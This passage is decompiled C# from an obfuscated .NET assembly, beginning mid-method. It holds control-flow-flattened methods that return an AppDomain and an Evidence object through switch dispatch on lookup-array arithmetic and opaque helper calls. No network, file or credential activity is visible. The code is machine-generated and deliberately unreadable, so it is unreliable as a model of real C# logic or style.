						goto case 21;
					}
					break;
				}
			}
		}
		catch (Exception exception_)
		{
			int num13 = default(int);
			int num14 = default(int);
			int num15 = default(int);
			Class25.smethod_11(exception_, new object[18]
			{
				num6, obj, num12, num7, num13, num2, int_2, byte_3, num14, num4,
				byte_2, int_, num15, num, byte_, char_, int_0, char_0
			});
			throw;
		}
	}

	internal static AppDomain smethod_2(int int_0, short short_0)
	{
		byte[] byte_ = default(byte[]);
		char[] char_ = default(char[]);
		Array byte_2 = default(Array);
		object int_ = default(object);
		int num = default(int);
		ICloneable int_2 = default(ICloneable);
		int num2 = default(int);
		int num11 = default(int);
		int num8 = default(int);
		object obj = default(object);
		int num4 = default(int);
		try
		{
			byte_ = Class35.byte_1;
			char_ = Class45.char_0;
			while (true)
			{
				byte_2 = Class35.byte_0;
				int_ = Class36.int_0;
				num = 14;
				while (true)
				{
					int_2 = Class35.int_0;
					num2 = 5;
					num = 17;
					while (true)
					{
						IL_04b5:
						num = char_[290] - 45374;
						while (true)
						{
							int num3;
							int num6;
							int num5;
							int num7;
							int num10;
							switch (num)
							{
							case 41:
								num3 = (int_ as int[])[156] - 59537;
								goto IL_0025;
							case 40:
								num6 = 1;
								goto IL_003b;
							case 38:
								num5 = 17;
								goto IL_0051;
							case 37:
								num3 = (byte_2 as byte[])[97];
								goto IL_0025;
							case 10:
							case 36:
								num3 = (byte_2 as byte[])[222];
								goto IL_0025;
							default:
								num = byte_[269] * 3;
								continue;
							case 24:
							case 34:
								num11 = 0;
								num8 = 8;
								num2 = 14;
								num = char_[289] - 37583;
								continue;
							case 33:
								switch (num8)
								{
								case 0:
									goto IL_00ea;
								case 1:
									goto IL_00fe;
								case 2:
									goto IL_0107;
								case 3:
									goto IL_0120;
								case 4:
									goto IL_0134;
								case 5:
									goto IL_013e;
								case 6:
									goto IL_014c;
								case 7:
									goto IL_015a;
								case 8:
									goto IL_0164;
								case 9:
									goto IL_016e;
								case 10:
									goto IL_0186;
								case 11:
									goto IL_018f;
								}
								num = 8;
								goto case 8;
							case 8:
								num3 = 12;
								goto IL_0025;
							case 32:
								num3 = (int_ as int[])[14] - 52162;
								goto IL_0025;
							case 30:
								num3 = 1;
								goto IL_0025;
							case 0:
								num3 = 10;
								goto IL_0025;
							case 7:
								num3 = ((int[])int_)[24] - 59275;
								goto IL_0025;
							case 16:
								num3 = 15;
								goto IL_0025;
							case 31:
								num3 = 0;
								goto IL_0025;
							case 29:
								num7 = (int_ as int[])[110] - 42680;
								goto IL_01b0;
							case 17:
								switch (num2)
								{
								case 0:
									break;
								case 1:
									goto IL_024b;
								case 2:
									goto IL_025d;
								case 3:
									goto IL_0263;
								case 6:
									goto IL_02a0;
								case 7:
									goto IL_02a6;
								case 8:
									goto IL_02af;
								case 9:
									goto IL_02c3;
								case 10:
									goto IL_02d7;
								case 12:
									goto IL_02eb;
								case 13:
									goto IL_02fc;
								case 15:
									goto IL_0306;
								case 16:
									goto IL_0342;
								case 17:
									goto IL_0356;
								case 18:
									goto IL_035c;
								case 19:
									goto IL_036b;
								case 14:
									goto IL_03b7;
								case 5:
									goto IL_04b5;
								default:
									goto IL_04c9;
								case 4:
									goto IL_04cf;
								case 11:
									goto IL_04da;
								}
								num = 23;
								goto case 23;
							case 23:
								switch (((short_0 ^ int_0) - 94) ^ num11)
								{
								case 0:
									goto IL_0242;
								}
								num = 18;
								goto case 18;
							case 18:
								num5 = (int_ as int[])[205] - 10434;
								goto IL_0051;
							case 21:
								num8 = 8;
								num2 = 14;
								num = 17;
								goto IL_03b7;
							case 15:
								obj = Class46.Class47.smethod_0('Ɛ', 'Ɣ');
								num8 = 11;
								num2 = (int_ as int[])[130] - 1531;
								num = char_[112] - 54552;
								continue;
							case 1:
								num8 = 0;
								num2 = 14;
								num = 17;
								goto IL_03b7;
							case 22:
								num6 = 8;
								goto IL_003b;
							case 19:
								num11++;
								num4 = short_0 * short_0;
								num4 = short_0 + num4;
								num = 4;
								goto case 4;
							case 4:
								num2 = ((int[])int_)[11] - 33121;
								num = byte_[190] - byte_[92];
								continue;
							case 5:
								num10 = 5;
								goto IL_0361;
							case 3:
								num10 = 9;
								goto IL_0361;
							case 2:
							{
								obj = null;
								int num9 = ((int_2 as Array) as int[])[300];
								Class35.int_0[47] = Class35.int_0[47] & Class35.int_0[223] & 0xBF;
								num8 = num9 - 29447;
								num = 26;
								goto case 20;
							}
							case 20:
							case 26:
								num2 = 14;
								num = 17;
								goto IL_03b7;
							case 28:
								num8 = 2;
								num2 = 14;
								num = 17;
								goto IL_03b7;
							case 27:
								num7 = 8;
								goto IL_01b0;
							case 25:
								num3 = 15;
								goto IL_0025;
							case 13:
								if (num4 % 2 == 0)
								{
									num = 27;
									goto case 27;
								}
								num = byte_[80] + byte_[134];
								continue;
							case 9:
								num3 = 3;
								goto IL_0025;
							case 6:
								num3 = 12;
								goto IL_0025;
							case 39:
								num2 = 11;
								num = 17;
								goto IL_04da;
							case 14:
								break;
							case 12:
								goto end_IL_04de;
							case 11:
								{
									return (obj as MarshalByRefObject) as AppDomain;
								}
								IL_0051:
								num2 = num5;
								num = char_[120] - 41938;
								continue;
								IL_01b0:
								num2 = num7;
								num = 17;
								goto case 17;
								IL_04cf:
								num = 39;
								goto case 39;
								IL_04c9:
								num = 39;
								goto case 39;
								IL_04da:
								num = 14;
								break;
								IL_036b:
								num = 2;
								goto case 2;
								IL_035c:
								num = 3;
								goto case 3;
								IL_0356:
								num = 5;
								goto case 5;
								IL_0361:
								num8 = num10;
								num2 = 14;
								num = 17;
								goto IL_03b7;
								IL_0342:
								num = char_[156] - 47208;
								continue;
								IL_0306:
								num = 19;
								goto case 19;
								IL_02fc:
								num = 22;
								goto case 22;
								IL_02eb:
								num = 1;
								goto case 1;
								IL_02d7:
								num = byte_[144] - 184;
								continue;
								IL_02c3:
								num = char_[206] - 63980;
								continue;
								IL_02af:
								num = char_[312] - 58529;
								continue;
								IL_02a6:
								num = 33;
								goto case 33;
								IL_02a0:
								num = 22;
								goto case 22;
								IL_0263:
								num = 15;
								goto case 15;
								IL_025d:
								num = 15;
								goto case 15;
								IL_024b:
								num = 21;
								goto case 21;
								IL_03b7:
								num = 33;
								goto case 33;
								IL_003b:
								num8 = num6;
								num2 = 14;
								num = char_[7] - 18159;
								continue;
								IL_0242:
								num = 38;
								goto case 38;
								IL_018f:
								num = 16;
								goto case 16;
								IL_0186:
								num = 41;
								goto case 41;
								IL_016e:
								num = 7;
								goto case 7;
								IL_0164:
								num = byte_[0];
								continue;
								IL_015a:
								num = 0;
								goto case 0;
								IL_014c:
								num = byte_[265];
								continue;
								IL_013e:
								num = byte_[197];
								continue;
								IL_0134:
								num = 30;
								goto case 30;
								IL_0120:
								num = char_[133] - 45123;
								continue;
								IL_0107:
								num = 32;
								goto case 32;
								IL_00fe:
								num = 10;
								goto case 10;
								IL_00ea:
								num = char_[192] - 37480;
								continue;
								IL_0025:
								num2 = num3;
								num = char_[326] - 63340;
								continue;
							}
							break;
						}
						break;
					}
					continue;
					end_IL_04de:
					break;
				}
			}
		}
		catch (Exception exception_)
		{
			int num12 = default(int);
			int num13 = default(int);
			int num14 = default(int);
			Class25.smethod_11(exception_, new object[16]
			{
				num11, obj, num4, num12, num8, int_2, num13, num2, byte_2, int_,
				num14, num, byte_, char_, int_0, short_0
			});
			throw;
		}
	}

	internal static Evidence smethod_3<T>(object object_0, short short_0, int int_0) where T : Assembly
	{
		byte[] byte_ = default(byte[]);
		char[] char_ = default(char[]);
		object int_ = default(object);
		object byte_2 = default(object);
		int num = default(int);
		object int_2 = default(object);
		object byte_3 = default(object);
		int num2 = default(int);
		int num3 = default(int);
		object obj = default(object);
		int num10 = default(int);
		try
		{
			byte_ = Class35.byte_1;
			char_ = Class45.char_0;
			while (true)
			{
				int_ = Class36.int_0;
				byte_2 = Class35.byte_0;
				num = 6;
				while (true)
				{
					int_2 = Class35.int_0;
					byte_3 = Class36.byte_0;
					num2 = (byte_2 as byte[])[213] - 79;
					num = 40;
					while (true)
					{
						IL_0567:
						int num6;
						int num7;
						int num8;
						int num9;
						int num11;
						switch (num2)
						{
						case 18:
							num = 24;
							goto IL_0018;
						case 17:
							num = 25;
							goto IL_007a;
						case 7:
							num = 10;
							goto IL_01f0;
						case 15:
							num = char_[219] - 56713;
							goto IL_032b;
						case 14:
							num = 4;
							goto IL_0316;
						case 13:
							num = byte_[40] * 2;
							goto IL_032b;
						case 12:
							num = 17;
							goto IL_0193;
						case 11:
							num = char_[306] - 1617;
							goto IL_032b;
						case 10:
							num = 39;
							goto IL_00a3;
						case 9:
							num = 31;
							goto IL_0411;
						case 8:
							num = 38;
							goto IL_00c6;
						case 6:
							num = char_[284] - 8227;
							goto IL_032b;
						case 5:
							num = char_[195] - 49199;
							goto IL_032b;
						case 4:
							num = char_[208] - 58549;
							goto IL_032b;
						case 3:
							num = char_[15] - 43267;
							goto IL_032b;
						case 1:
							num = 35;
							goto IL_0020;
						case 0:
							num = byte_[81];
							goto IL_032b;
						default:
							num = 18;
							goto IL_03f3;
						case 2:
							num = 6;
							break;
						case 16:
							{
								num = 34;
								goto IL_05ff;
							}
							IL_007a:
							num3 = ((int[])int_2)[219] - 5881;
							num = char_[142] - 26675;
							goto IL_032b;
							IL_032b:
							while (true)
							{
								int num4;
								switch (num)
								{
								case 24:
									break;
								case 35:
									goto IL_0020;
								case 41:
									goto IL_0048;
								case 9:
									goto IL_0061;
								case 25:
									goto IL_007a;
								case 39:
									goto IL_00a3;
								case 38:
									goto IL_00c6;
								case 33:
									obj = null;
									num3 = ((int[])int_2)[29] - 11758;
									num2 = (int_ as int[])[34] - 23419;
									goto case 8;
								case 8:
									num = char_[103] - 60864;
									continue;
								case 32:
									obj = Class46.Class47.Class48.smethod_4<Assembly>(object_0, 39, 125);
									num = char_[120] - 41924;
									continue;
								case 30:
									goto IL_0147;
								case 29:
									goto IL_015c;
								case 28:
									goto IL_0160;
								case 26:
									goto IL_0164;
								case 23:
									goto IL_0168;
								case 20:
									goto IL_017d;
								case 19:
									goto IL_0181;
								case 17:
									goto IL_0193;
								case 16:
									goto IL_01cd;
								case 15:
									goto IL_01d3;
								case 12:
									goto IL_01da;
								case 10:
									goto IL_01f0;
								case 3:
									goto IL_024d;
								case 0:
									goto IL_0256;
								case 11:
									goto IL_02df;
								case 5:
									num3 = 7;
									num2 = (int)((byte[])byte_2)[79] / 5;
									num = char_[138] - 51013;
									continue;
								case 4:
									goto IL_0316;
								case 2:
									goto IL_031c;
								case 14:
									goto IL_03df;
								case 18:
									goto IL_03f3;
								case 22:
									num4 = 3;
									goto IL_0464;
								case 31:
									goto IL_0411;
								case 21:
									goto IL_0413;
								case 13:
									goto IL_0421;
								case 36:
								{
									num3 = 1;
									byte num5 = (byte_2 as byte[])[18];
									Class36.int_0[262] = (Class36.int_0[262] + short_0) & 0x77;
									num2 = num5 - 165;
									num = 40;
									goto IL_0567;
								}
								case 37:
									num4 = 9;
									goto IL_0464;
								case 27:
									goto IL_0487;
								case 40:
									goto IL_0567;
								case 6:
									goto end_IL_0569;
								default:
									num = 1;
									goto end_IL_05bf;
								case 1:
									goto end_IL_05bf;
								case 34:
									goto IL_05ff;
									IL_0464:
									num3 = num4;
									num2 = ((int[])int_)[249] - 53875;
									num = 40;
									goto IL_0567;
								}
								break;
							}
							goto IL_0018;
							IL_05ff:
							return obj as Evidence;
							IL_0411:
							num3 = 4;
							goto IL_0413;
							IL_0413:
							num2 = (int)(byte_2 as byte[])[47] / 2;
							goto IL_0421;
							IL_0421:
							num = 40;
							continue;
							IL_03f3:
							num2 = ((int[])int_)[53] - 44248;
							num = 40;
							continue;
							IL_03df:
							num6 = (byte_2 as byte[])[0] - 215;
							goto IL_0489;
							IL_031c:
							num7 = (byte_2 as byte[])[45];
							goto IL_0149;
							IL_0316:
							num8 = 8;
							goto IL_01e4;
							IL_01da:
							num8 = ((byte[])byte_3)[61];
							goto IL_01e4;
							IL_01e4:
							num3 = num8;
							num2 = 7;
							num = 40;
							goto case 7;
							IL_01f0:
							switch (num3)
							{
							case 0:
								goto IL_0238;
							case 1:
								goto IL_024a;
							case 2:
								goto IL_0253;
							case 3:
								goto IL_026a;
							case 4:
								goto IL_027f;
							case 5:
								goto IL_0294;
							case 6:
								goto IL_02a9;
							case 7:
								goto IL_02b2;
							case 8:
								goto IL_02bb;
							case 9:
								goto IL_02c4;
							case 10:
								goto IL_02cd;
							case 11:
								goto IL_02db;
							}
							num = char_[37] - 55960;
							goto IL_032b;
							IL_02db:
							num = 11;
							goto IL_02df;
							IL_02df:
							num7 = (int_ as int[])[113] - 56607;
							goto IL_0149;
							IL_02cd:
							num = (int)byte_[156] / 2;
							goto IL_032b;
							IL_02c4:
							num = 16;
							goto IL_01cd;
							IL_02bb:
							num = 29;
							goto IL_015c;
							IL_02b2:
							num = 28;
							goto IL_0160;
							IL_02a9:
							num = 19;
							goto IL_0181;
							IL_0294:
							num = char_[203] - 32618;
							goto IL_032b;
							IL_027f:
							num = char_[138] - 51023;
							goto IL_032b;
							IL_026a:
							num = char_[152] - 18758;
							goto IL_032b;
							IL_0253:
							num = 0;
							goto IL_0256;
							IL_0256:
							num7 = (int_ as int[])[3] - 19651;
							goto IL_0149;
							IL_024a:
							num = 3;
							goto IL_024d;
							IL_024d:
							num7 = 8;
							goto IL_0149;
							IL_0238:
							num = byte_[132] - 42;
							goto IL_032b;
							IL_0048:
							num9 = ((byte[])byte_2)[144] - 230;
							goto IL_006b;
							IL_01d3:
							num7 = 11;
							goto IL_0149;
							IL_01cd:
							num7 = 5;
							goto IL_0149;
							IL_0193:
							num10 = 0;
							num3 = ((int[])int_2)[278] - 45930;
							num2 = ((byte[])byte_2)[169] - 222;
							num = byte_[156];
							goto IL_032b;
							IL_0181:
							num7 = (int_ as int[])[11] - 33124;
							goto IL_0149;
							IL_017d:
							num7 = 11;
							goto IL_0149;
							IL_0168:
							num7 = (int_ as int[])[258] - 5983;
							goto IL_0149;
							IL_0164:
							num7 = 17;
							goto IL_0149;
							IL_0160:
							num7 = 12;
							goto IL_0149;
							IL_015c:
							num7 = 16;
							goto IL_0149;
							IL_0147:
							num7 = 18;
							goto IL_0149;
							IL_0149:
							num2 = num7;
							num = char_[7] - 18136;
							goto IL_032b;
							IL_00c6:
							switch (((int_0 ^ short_0) - 41) ^ num10)
							{
							case 0:
								break;
							default:
								goto IL_0483;
							}
							num = char_[107] - 12132;
							goto IL_032b;
							IL_0483:
							num = 27;
							goto IL_0487;
							IL_0487:
							num6 = 15;
							goto IL_0489;
							IL_0489:
							num2 = num6;
							num = 40;
							continue;
							IL_006b:
							num2 = num9;
							num = 40;
							continue;
							IL_00a3:
							num2 = (int)(byte_2 as byte[])[47] / 2;
							num = char_[289] - 37560;
							goto IL_032b;
							IL_0018:
							num10++;
							num = 35;
							goto IL_0020;
							IL_0020:
							num11 = short_0 * short_0;
							Class45.char_0[153] = (char)((Class45.char_0[153] | int_0) & ' ');
							if ((num11 + short_0) % 2 != 0)
							{
								num = 41;
								goto IL_0048;
							}
							num = 9;
							goto IL_0061;
							IL_0061:
							num9 = ((byte[])byte_2)[47];
							goto IL_006b;
							end_IL_0569:
							break;
						}
						break;
					}
					continue;
					end_IL_05bf:
					break;
				}
			}
		}
		catch (Exception exception_)
		{
			int num12 = default(int);
			int num13 = default(int);
			int num14 = default(int);
			Class25.smethod_11(exception_, new object[17]
			{
				num10, obj, num12, num3, int_2, byte_3, num13, num2, int_, byte_2,
				num14, num, byte_, char_, object_0, short_0, int_0
			});
			throw;
		}
	}
}
